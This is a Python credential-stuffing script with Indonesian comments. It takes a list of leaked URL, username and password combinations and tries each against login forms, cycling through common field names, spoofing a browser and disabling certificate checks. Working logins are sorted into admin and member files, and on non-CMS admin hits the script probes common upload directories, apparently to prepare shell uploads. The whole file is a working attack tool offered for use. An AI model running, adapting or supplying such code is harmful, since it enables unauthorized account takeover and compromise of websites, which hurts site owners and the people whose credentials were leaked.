import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin
import random
import time

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/90.0.4430.212 Safari/537.36"
}

# Kombinasi field login umum
user_fields = ["username", "user", "login", "cpf", "email"]
pass_fields = ["password", "senha", "pass"]

# Keyword deteksi login sukses dan tipe role
success_keywords = ["dashboard", "bem vindo", "logout", "sair"]
admin_keywords = ["admin", "administrator", "control panel", "/admin", "/admin/dashboard"]
member_keywords = ["user", "member", "akun", "beranda", "welcome"]

# CMS identifier
cms_keywords = ["wp-content", "wordpress", "joomla", "moodle", "drupal", "prestashop", "opencart", "laravel", "cms"]

# Path upload umum untuk dicoba pada admin non-CMS
upload_paths = [
    "/upload/",
    "/uploads/",
    "/fileupload/",
    "/admin/upload/",
    "/admin/uploads/",
    "/files/",
    "/data/",
    "/media/",
    "/public/uploads/"
]

# Load list loginan
with open("list.txt", "r", encoding='utf-8', errors='ignore') as f:
    targets = [line.strip() for line in f if line.strip()]

def scan_upload_dirs(base_url):
    found = []
    for path in upload_paths:
        test_url = urljoin(base_url, path)
        try:
            r = requests.get(test_url, headers=headers, timeout=10, verify=False)
            if r.status_code == 200 and any(x in r.text.lower() for x in ["index of", "upload", "file", "directory"]):
                found.append(test_url)
        except:
            continue
    return found

def check_login(line):
    try:
        url, user, passwd = line.split("|")
        is_cms = any(k in url.lower() for k in cms_keywords)

        for u_field in user_fields:
            for p_field in pass_fields:
                data = {
                    u_field: user,
                    p_field: passwd
                }
                try:
                    r = requests.post(url, data=data, headers=headers, timeout=10, verify=False, allow_redirects=True)
                    content = r.text.lower()
                    final_url = r.url.lower()

                    if any(k in content for k in success_keywords) or final_url != url.lower():
                        full_info = f"{url}|{user}|{passwd}\n"

                        if any(k in content for k in admin_keywords) or any(k in final_url for k in admin_keywords):
                            if is_cms:
                                print(f"[ADMIN-CMS] {url} | {user} | {passwd}")
                                with open("admin_cms.txt", "a", encoding='utf-8') as a:
                                    a.write(full_info)
                            else:
                                print(f"[ADMIN-NONCMS] {url} | {user} | {passwd}")
                                with open("admin_noncms.txt", "a", encoding='utf-8') as a:
                                    a.write(full_info)
                                base = url.split("/", 3)
                                base_url = base[0] + "//" + base[2] + "/"
                                uploads = scan_upload_dirs(base_url)
                                if uploads:
                                    with open("upload_found.txt", "a", encoding='utf-8') as u:
                                        for up in uploads:
                                            u.write(f"{url}|{up}\n")
                                            print(f"[UPLOAD DIR] {up}")
                        else:
                            if is_cms:
                                print(f"[MEMBER-CMS] {url} | {user} | {passwd}")
                                with open("member_cms.txt", "a", encoding='utf-8') as m:
                                    m.write(full_info)
                            else:
                                print(f"[MEMBER-NONCMS] {url} | {user} | {passwd}")
                                with open("member_noncms.txt", "a", encoding='utf-8') as m:
                                    m.write(full_info)
                        return
                except Exception:
                    continue
        print(f"[FAILED] {url} | {user} | {passwd}")
    except:
        print(f"[INVALID FORMAT] {line}")

print("[+] Mulai cek loginan bro...")
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(check_login, targets)
print("[+] Selesai bro, hasil valid dipisahkan di admin/member & cms/noncms, hasil upload di upload_found.txt")
